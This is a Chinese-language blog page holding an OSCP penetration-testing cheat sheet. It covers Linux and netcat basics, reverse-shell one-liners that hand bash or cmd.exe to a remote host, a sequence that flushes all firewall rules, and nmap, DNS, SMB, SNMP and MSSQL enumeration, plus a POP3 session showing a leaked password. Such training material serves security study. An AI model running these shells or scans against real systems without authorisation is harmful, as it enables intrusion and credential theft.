@@ -1,0 +1,2402 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="OSCP常用cheatsheet, ezy&#39;s blog">
+    <meta name="description" content="源自https://github.com/Elinpf/OSCP-survival-guide
+linux设置ip系统变量
+export ip=192.168.1.100
+
+寻找文件位置
+locate a.exe
+
+在 $PATH 环境变量">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>OSCP常用cheatsheet | ezy&#39;s blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">ezy&#39;s blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">ezy&#39;s blog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">OSCP常用cheatsheet</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E9%9D%B6%E5%9C%BA/">
+                                <span class="chip bg-color">靶场</span>
+                            </a>
+                        
+                            <a href="/tags/%E7%AC%94%E8%AE%B0/">
+                                <span class="chip bg-color">笔记</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                渗透测试
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-10-30
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2022-10-30
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    10.9k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    56 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+        <!-- 代码块折行 -->
+        <style type="text/css">
+            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
+        </style>
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>源自<a target="_blank" rel="noopener" href="https://github.com/Elinpf/OSCP-survival-guide">https://github.com/Elinpf/OSCP-survival-guide</a></p>
+<h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">设置ip系统变量
+<span class="token builtin class-name">export</span> <span class="token assign-left variable">ip</span><span class="token operator">=</span><span class="token number">192.168</span>.1.100
+
+寻找文件位置
+<span class="token function">locate</span> a.exe
+
+在 <span class="token environment constant">$PATH</span> 环境变量中搜索目录
+<span class="token function">which</span> directory_name
+
+查找文件名中包含特定字符串的文件
+<span class="token function">find</span> / -name <span class="token string">"sbd*"</span>
+
+显示连接情况
+<span class="token function">netstat</span> -lntp
+
+改密码
+<span class="token function">passwd</span>
+
+验证某服务是否运行
+<span class="token function">netstat</span> -antp <span class="token operator">|</span><span class="token function">grep</span> apache
+开启服务
+systemctl start <span class="token function">ssh</span>
+使服务开机自启动
+systemctl <span class="token builtin class-name">enable</span> <span class="token function">ssh</span>
+停止服务
+systemctl stop <span class="token function">ssh</span>
+
+解压gz文件
+gunzip access.log.gz
+解压tar.gz文件
+<span class="token function">tar</span> -xzvf file.tar.gz
+
+打开网页
+<span class="token function">curl</span> https://www.cisco.com
+
+字符串操作
+文件行数
+<span class="token function">wc</span> -l index.html
+查看文件开头或尾部
+<span class="token function">head</span> index.html
+<span class="token function">tail</span> index.html
+在文件中提取包含特定字符串的所有行
+<span class="token function">grep</span> <span class="token string">"href="</span> index.html
+通过分隔符剪切字符串，过滤结果然后排序
+<span class="token function">grep</span> <span class="token string">"href="</span> index.html <span class="token operator">|</span> <span class="token function">cut</span> -d <span class="token string">"/"</span> -f <span class="token number">3</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"<span class="token entity" title="\\">\\</span>."</span> <span class="token operator">|</span> <span class="token function">cut</span> -d <span class="token string">'"'</span> -f <span class="token number">1</span> <span class="token operator">|</span> <span class="token function">sort</span> -u
+使用 <span class="token function">grep</span> 和正则表达式并输出到文件
+<span class="token function">cat</span> index.html <span class="token operator">|</span> <span class="token function">grep</span> -o <span class="token string">'http://\[^"\]\*'</span> <span class="token operator">|</span> <span class="token function">cut</span> -d <span class="token string">"/"</span> -f <span class="token number">3</span> <span class="token operator">|</span> <span class="token function">sort</span> –u <span class="token operator">></span> list.txt
+使用 <span class="token function">bash</span> 循环查找每个主机后面的 IP 地址
+<span class="token keyword">for</span> <span class="token for-or-select variable">url</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> list.txt<span class="token variable">)</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">host</span> <span class="token variable">$url</span><span class="token punctuation">;</span> <span class="token keyword">done</span>
+从日志文件中收集所有 IP 地址并按频率排序
+<span class="token function">cat</span> access.log <span class="token operator">|</span> <span class="token function">cut</span> -d <span class="token string">" "</span> -f <span class="token number">1</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> -c <span class="token operator">|</span> <span class="token function">sort</span> -urn
+
+加解码
+base64
+<span class="token builtin class-name">echo</span> -n <span class="token string">"QWxhZGRpbjpvcGVuIHNlc2FtZQ=="</span> <span class="token operator">|</span> base64 --decode
+<span class="token number">16</span>进制
+<span class="token builtin class-name">echo</span> -n <span class="token string">"46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874"</span> <span class="token operator">|</span> xxd -r -ps
+
+<span class="token function">nc</span>
+下载地址
+https://eternallybored.org/misc/netcat/
+连接到 POP3 邮件服务器
+<span class="token function">nc</span> -nv <span class="token variable">$ip</span> <span class="token number">110</span>
+监听 TCP/UDP 端口
+<span class="token function">nc</span> -nlvp <span class="token number">4444</span>
+连接到 <span class="token function">nc</span> 端口
+<span class="token function">nc</span> -nv <span class="token variable">$ip</span> <span class="token number">4444</span>
+使用 <span class="token function">nc</span> 发送文件
+<span class="token function">nc</span> -nv <span class="token variable">$ip</span> <span class="token number">4444</span> <span class="token operator">&lt;</span> /usr/share/windows-binaries/wget.exe
+使用 netcat 接收文件
+<span class="token function">nc</span> -nlvp <span class="token number">4444</span> <span class="token operator">></span> incoming.exe
+一些操作系统（OpenBSD）将使用 nc.traditional 而不是 <span class="token function">nc</span> 所以要小心
+<span class="token function">whereis</span> <span class="token function">nc</span>
+nc: /bin/nc.traditional /usr/share/man/man1/nc.1.gz
+/bin/nc.traditional -e /bin/bash <span class="token number">1.2</span>.3.4 <span class="token number">4444</span>
+在 Windows 上使用 cmd.exe 创建带有 <span class="token function">nc</span> 的反向 shell
+nc.exe -nlvp <span class="token number">4444</span> -e cmd.exe
+或者
+nc.exe -nv <span class="token operator">&lt;</span>Remote IP<span class="token operator">></span> <span class="token operator">&lt;</span>Remote Port<span class="token operator">></span> -e cmd.exe
+在 Linux 上使用 <span class="token function">bash</span> 创建带有 <span class="token function">nc</span> 的反向 shell
+<span class="token function">nc</span> -nv <span class="token variable">$ip</span> <span class="token number">4444</span> -e /bin/bash
+nc用于Banner抓取
+<span class="token builtin class-name">echo</span> <span class="token string">""</span> <span class="token operator">|</span> <span class="token function">nc</span> -nv -w1 <span class="token operator">&lt;</span>IP Address<span class="token operator">></span> <span class="token operator">&lt;</span>Ports<span class="token operator">></span>
+Ncat - 用于 Nmap 项目的 Netcat，提供更多安全性，避免 IDS
+使用 ssl 使用 cmd.exe 从 Windows 反向 shell
+ncat --exec cmd.exe --allow <span class="token variable">$ip</span> -vnl <span class="token number">4444</span> --ssl
+使用 ssl 监听端口 <span class="token number">4444</span>
+ncat -v <span class="token variable">$ip</span> <span class="token number">4444</span> --ssl
+
+wireshark
+仅显示 SMTP（端口 <span class="token number">25</span>）和 ICMP 流量
+tcp.port eq <span class="token number">25</span> or icmp
+仅显示 LAN <span class="token punctuation">(</span><span class="token number">192.168</span>.xx<span class="token punctuation">)</span> 中工作站和服务器之间的流量——没有 Internet
+ip.src<span class="token operator">==</span><span class="token number">192.168</span>.0.0/16 and ip.dst<span class="token operator">==</span><span class="token number">192.168</span>.0.0/16
+按协议（例如 SIP）过滤并过滤掉不需要的 IP
+ip.src <span class="token operator">!=</span> xxx.xxx.xxx.xxx <span class="token operator">&amp;&amp;</span> ip.dst <span class="token operator">!=</span> xxx.xxx.xxx.xxx <span class="token operator">&amp;&amp;</span> sip
+有些命令是相等的
+ip.addr <span class="token operator">==</span> xxx.xxx.xxx.xxx
+等于
+ip.src <span class="token operator">==</span> xxx.xxx.xxx.xxx or ip.dst <span class="token operator">==</span> xxx.xxx.xxx.xxx
+ip.addr <span class="token operator">!=</span> xxx.xxx.xxx.xxx
+等于
+ip.src <span class="token operator">!=</span> xxx.xxx.xxx.xxx or ip.dst <span class="token operator">!=</span> xxx.xxx.xxx.xxx
+
+Tcpdump
+显示 pcap 文件
+tcpdump -r passwordz.pcap
+显示 ips 和过滤和排序
+tcpdump -n -r passwordz.pcap <span class="token operator">|</span> <span class="token function">awk</span> -F<span class="token string">" "</span> <span class="token string">'&#123;print $3&#125;'</span> <span class="token operator">|</span> <span class="token function">sort</span> -u <span class="token operator">|</span> <span class="token function">head</span>
+在端口 <span class="token number">80</span> 上抓取数据包
+tcpdump tcp port <span class="token number">80</span> -w output.pcap -i eth0
+检查 TCP 数据包中设置的 ACK 或 PSH 标志
+tcpdump -A -n <span class="token string">'tcp[13] = 24'</span> -r passwordz.pcap
+
+iptables
+拒绝到除本地环回以外的端口的流量
+iptables -A INPUT -p tcp --destination-port <span class="token number">13327</span> <span class="token operator">!</span> -d <span class="token variable">$ip</span> -j DROP
+iptables -A INPUT -p tcp --destination-port <span class="token number">9991</span> <span class="token operator">!</span> -d <span class="token variable">$ip</span> -j DROP
+清除所有 IPTables 防火墙规则
+iptables -P INPUT ACCEPT
+iptables -P FORWARD ACCEPT
+iptables -P OUTPUT ACCEPT
+iptables -t nat -F
+iptables -t mangle -F
+iptables -F
+iptables -X
+iptables -t raw -F iptables -t raw -X<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="信息收集和漏洞扫描"><a href="#信息收集和漏洞扫描" class="headerlink" title="信息收集和漏洞扫描"></a>信息收集和漏洞扫描</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">被动信息收集
+
+
+google hacking
+查找网站子域
+site:microsoft.com
+文件类型和标题
+intitle:<span class="token string">"netbotz appliance"</span> <span class="token string">"OK"</span> -filetype:pdf
+网址
+inurl:<span class="token string">"level/15/sexec/-/show"</span>
+google hacking数据库：
+https://www.exploit-db.com/google-hacking-database/
+
+SSL 证书测试
+https://www.ssllabs.com/ssltest/
+
+电子邮件收集
+简单的电子邮件
+<span class="token function">git</span> clone https://github.com/killswitch-GUI/SimplyEmail.git
+./SimplyEmail.py -all -e TARGET-DOMAIN
+
+LDAP
+LDAP 空绑定
+ldapsearch -x -b <span class="token string">"ou=anonymous,dc=challenge01,dc=root-me,dc=org"</span> -H <span class="token string">"ldap://challenge01.root-me.org:54013"</span>
+
+netcraft
+确定用于构建站点的操作系统和工具
+https://searchdns.netcraft.com/
+
+Whois 枚举
+whois domain-name-here.com
+whois <span class="token variable">$ip</span>
+
+Banner Grabbing
+<span class="token function">nc</span> -v <span class="token variable">$ip</span> <span class="token number">25</span>
+telnet <span class="token variable">$ip</span> <span class="token number">25</span>
+<span class="token function">nc</span> TARGET-IP <span class="token number">80</span>
+
+Recon-ng - 用 Python 编写的全功能网络侦察框架
+<span class="token builtin class-name">cd</span> /opt<span class="token punctuation">;</span> <span class="token function">git</span> clone https://github.com/lanmaster53/recon-ng.git
+<span class="token builtin class-name">cd</span> /opt/recon-ng
+./recon-ng
+show modules
+<span class="token builtin class-name">help</span>
+
+
+主动信息收集
+
+
+端口扫描
+nmap -A -T4 -p- <span class="token variable">$ip</span>
+Netcat端口扫描
+<span class="token function">nc</span> -nvv -w <span class="token number">1</span> -z <span class="token variable">$ip</span> <span class="token number">3388</span>-3390
+使用网络上的 ARP 发现活动 IP
+arp-scan <span class="token variable">$ip</span>/24
+发现还有谁在网络上
+netdiscover
+从 ARP 发现 IP Mac 和 Mac 供应商
+netdiscover -r <span class="token variable">$ip</span>/24
+使用 SYN 的 Nmap 隐身扫描
+nmap -sS <span class="token variable">$ip</span>
+使用 FIN 的 Nmap 隐形扫描
+nmap -sF <span class="token variable">$ip</span>
+Nmap Banner Grabbing
+nmap -sV -sT <span class="token variable">$ip</span>
+Nmap 操作系统指纹
+nmap -O <span class="token variable">$ip</span>
+Nmap 常规扫描
+nmap <span class="token variable">$ip</span>/24
+枚举扫描
+nmap -p <span class="token number">1</span>-65535 -sV -sS -A -T4 <span class="token variable">$ip</span>/24 -oN nmap.txt
+枚举扫描所有端口 TCP/UDP 并输出到 txt 文件
+nmap -oN nmap2.txt -v -sU -sS -p- -A -T4 <span class="token variable">$ip</span>
+Nmap 输出到文件：
+nmap -oN nmap.txt -p <span class="token number">1</span>-65535 -sV -sS -A -T4 <span class="token variable">$ip</span>/24
+快速扫描
+nmap -T4 -F <span class="token variable">$ip</span>/24
+快速扫描加：
+nmap -sV -T4 -O -F --version-light <span class="token variable">$ip</span>/24
+快速跟踪路由
+nmap -sn --traceroute <span class="token variable">$ip</span>
+所有 TCP 和 UDP 端口
+nmap -v -sU -sS -p- -A -T4 <span class="token variable">$ip</span>
+强烈扫描
+nmap -T4 -A -v <span class="token variable">$ip</span>
+密集扫描加 UDP
+nmap -sS -sU -T4 -A -v <span class="token variable">$ip</span>/24
+密集扫描所有 TCP 端口
+nmap -p <span class="token number">1</span>-65535 -T4 -A -v <span class="token variable">$ip</span>/24
+密集扫描 - 无 Ping
+nmap -T4 -A -v -Pn <span class="token variable">$ip</span>/24
+平扫描
+nmap -sn <span class="token variable">$ip</span>/24
+慢速综合扫描
+nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g <span class="token number">53</span> --script <span class="token string">"default or (discovery and safe)"</span> <span class="token variable">$ip</span>/24
+使用主动连接进行扫描，以清除任何旨在欺骗您的欺骗端口
+nmap -p1-65535 -A -T5 -sT <span class="token variable">$ip</span>
+
+DNS 枚举
+NMAP DNS 主机名查找 
+nmap -F --dns-server <span class="token operator">&lt;</span>dns server ip<span class="token operator">></span> <span class="token operator">&lt;</span>target <span class="token function">ip</span> range<span class="token operator">></span>
+主机查找
+<span class="token function">host</span> -t ns megacorpone.com
+反向查找蛮力 - 查找相同范围内的域
+<span class="token keyword">for</span> <span class="token for-or-select variable">ip</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">seq</span> <span class="token number">155</span> <span class="token number">190</span><span class="token variable">)</span></span><span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token function">host</span> <span class="token number">50.7</span>.67.<span class="token variable">$ip</span><span class="token punctuation">;</span><span class="token keyword">done</span> <span class="token operator">|</span><span class="token function">grep</span> -v <span class="token string">"not found"</span>
+执行 DNS IP 查找
+<span class="token function">dig</span> a domain-name-here.com @nameserver
+执行 MX 记录查找
+<span class="token function">dig</span> mx domain-name-here.com @nameserver
+使用 DIG 执行区域转移
+<span class="token function">dig</span> axfr domain-name-here.com @nameserver
+
+DNS 区域传输
+Windows DNS 区域传输
+<span class="token function">nslookup</span> -<span class="token operator">></span> <span class="token builtin class-name">set</span> <span class="token assign-left variable">type</span><span class="token operator">=</span>any -<span class="token operator">></span> <span class="token function">ls</span> -d blah.com
+Linux DNS 区域传输
+<span class="token function">dig</span> axfr blah.com @ns1.blah.com
+
+Dnsrecon DNS蛮力
+dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
+megacorp 的 Dnsrecon DNS 列表
+dnsrecon -d megacorpone.com -t axfr
+
+DNS枚举
+dnsenum zonetransfer.me
+
+NMap 枚举脚本列表：
+https://nmap.org/nsedoc/categories/discovery.html
+
+Nmap端口版本检测最大功率
+nmap -vvv -A --reason --script<span class="token operator">=</span><span class="token string">"+(safe or default) and not broadcast"</span> -p <span class="token operator">&lt;</span>port<span class="token operator">></span> <span class="token operator">&lt;</span>host<span class="token operator">></span>
+
+NFS（网络文件系统）枚举
+显示可挂载的 NFS 共享 
+nmap -sV --script<span class="token operator">=</span>nfs-showmount <span class="token variable">$ip</span>
+
+RPC（远程过程调用）枚举
+无需用户名和密码即可连接到 RPC 共享并枚举权限 
+rpcclient --user<span class="token operator">=</span><span class="token string">""</span> --command<span class="token operator">=</span>enumprivs -N <span class="token variable">$ip</span>
+使用用户名连接到 RPC 共享并枚举权限 
+rpcclient --user<span class="token operator">=</span><span class="token string">"&lt;Username>"</span> --command<span class="token operator">=</span>enumprivs <span class="token variable">$ip</span>
+
+SMB 枚举
+SMB 操作系统发现
+nmap <span class="token variable">$ip</span> --script smb-os-discovery.nse
+Nmap端口扫描
+nmap -v -p <span class="token number">139,445</span> -oG smb.txt <span class="token variable">$ip</span>-254
+Netbios 信息扫描
+nbtscan -r <span class="token variable">$ip</span>/24
+Nmap 找到暴露的 Netbios 服务器
+nmap -sU --script nbstat.nse -p <span class="token number">137</span> <span class="token variable">$ip</span>
+Nmap 所有 SMB 脚本扫描
+nmap -sV -Pn -vv -p <span class="token number">445</span> --script<span class="token operator">=</span><span class="token string">'(smb*) and not (brute or broadcast or dos or external or fuzzer)'</span> --script-args<span class="token operator">=</span>unsafe<span class="token operator">=</span><span class="token number">1</span> <span class="token variable">$ip</span>
+Nmap 所有 SMB 脚本认证扫描
+nmap -sV -Pn -vv -p <span class="token number">445</span> --script-args <span class="token assign-left variable">smbuser</span><span class="token operator">=</span><span class="token operator">&lt;</span>username<span class="token operator">></span>,smbpass<span class="token operator">=</span><span class="token operator">&lt;</span>password<span class="token operator">></span> --script<span class="token operator">=</span><span class="token string">'(smb*) and not (brute or broadcast or dos or external or fuzzer)'</span> --script-args<span class="token operator">=</span>unsafe<span class="token operator">=</span><span class="token number">1</span> <span class="token variable">$ip</span>
+SMB 枚举工具
+nmblookup -A <span class="token variable">$ip</span>
+smbclient //MOUNT/share -I <span class="token variable">$ip</span> -N
+rpcclient -U <span class="token string">""</span> <span class="token variable">$ip</span>
+enum4linux <span class="token variable">$ip</span>
+enum4linux -a <span class="token variable">$ip</span>
+smb指纹
+smbclient -L //<span class="token variable">$ip</span>
+Nmap 扫描打开的 SMB 共享
+nmap -T4 -v -oA shares --script smb-enum-shares --script-args <span class="token assign-left variable">smbuser</span><span class="token operator">=</span>username,smbpass<span class="token operator">=</span>password -p445 <span class="token number">192.168</span>.10.0/24
+Nmap 扫描易受攻击的 SMB 服务器
+nmap -v -p <span class="token number">445</span> --script<span class="token operator">=</span>smb-check-vulns --script-args<span class="token operator">=</span>unsafe<span class="token operator">=</span><span class="token number">1</span> <span class="token variable">$ip</span>
+Nmap 列出所有已安装的 SMB 脚本
+<span class="token function">ls</span> -l /usr/share/nmap/scripts/smb*
+枚举 SMB 用户
+nmap -sU -sS --script<span class="token operator">=</span>smb-enum-users -p U:137,T:139 <span class="token variable">$ip</span>-14
+或者
+python /usr/share/doc/python-impacket-doc/examples /samrdump.py <span class="token variable">$ip</span>
+RID Cycling - 空会话
+ridenum.py <span class="token variable">$ip</span> <span class="token number">500</span> <span class="token number">50000</span> dict.txt
+手动空会话测试
+视窗： net use <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token variable">$ip</span><span class="token punctuation">\</span>IPC$ <span class="token string">""</span> /u:<span class="token string">""</span>
+Linux： smbclient -L //<span class="token variable">$ip</span>
+
+SMTP 枚举 - 邮件服务器
+使用 Netcat 验证 SMTP 端口
+<span class="token function">nc</span> -nv <span class="token variable">$ip</span> <span class="token number">25</span>
+
+POP3 枚举 - 阅读其他人的邮件 - 您可能会找到电子邮件帐户的用户名和密码，所以这里是如何使用 Telnet 检查邮件
+telnet <span class="token variable">$ip</span> <span class="token number">110</span>
++OK beta POP3 server <span class="token punctuation">(</span>JAMES POP3 Server <span class="token number">2.3</span>.2<span class="token punctuation">)</span> ready 
+<span class="token environment constant">USER</span> billydean    
++OK
+PASS password
++OK Welcome billydean
+
+list
+
++OK <span class="token number">2</span> <span class="token number">1807</span>
+<span class="token number">1</span> <span class="token number">786</span>
+<span class="token number">2</span> <span class="token number">1021</span>
+
+retr <span class="token number">1</span>
+
++OK Message follows
+From: jamesbrown@motown.com
+Dear Billy Dean,
+
+Here is your login <span class="token keyword">for</span> remote desktop <span class="token punctuation">..</span>. try not to forget it this time<span class="token operator">!</span>
+username: billydean
+password: PA<span class="token variable">$$</span>W0RD<span class="token operator">!</span>Z
+
+SNMP 枚举 - 简单网络管理协议
+修复 SNMP 输出值，使其易于阅读
+<span class="token function">apt-get</span> <span class="token function">install</span> snmp-mibs-downloader download-mibs 
+<span class="token builtin class-name">echo</span> <span class="token string">""</span> <span class="token operator">></span> /etc/snmp/snmp.conf
+SNMP 枚举命令
+snmpcheck -t <span class="token variable">$ip</span> -c public
+snmpwalk -c public -v1 <span class="token variable">$ip</span> <span class="token number">1</span><span class="token operator">|</span><span class="token function">grep</span> hrSWRunName<span class="token operator">|</span><span class="token function">cut</span> -d<span class="token punctuation">\</span>* <span class="token punctuation">\</span>* -f
+snmpenum -t <span class="token variable">$ip</span>
+onesixtyone -c names -i hosts
+SNMPv3 枚举
+nmap -sV -p <span class="token number">161</span> --script<span class="token operator">=</span>snmp-info <span class="token variable">$ip</span>/24
+自动化 SNMPv3 的用户名枚举过程：
+<span class="token function">apt-get</span> <span class="token function">install</span> snmp snmp-mibs-downloader 
+<span class="token function">wget</span> https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb
+SNMP 默认凭据
+/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
+
+MSSQL 服务器枚举
+Nmap信息采集
+nmap -p <span class="token number">1433</span> --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port<span class="token operator">=</span><span class="token number">1433</span>,mssql.username<span class="token operator">=</span>sa,mssql.password<span class="token operator">=</span>,mssql.instance-name<span class="token operator">=</span>MSSQLSERVER <span class="token variable">$ip</span>
+
+Webmin 和 miniserv/0.01 枚举 - 端口 <span class="token number">10000</span>
+通过抓取 /etc/passwd 测试 LFI 和文件泄露漏洞
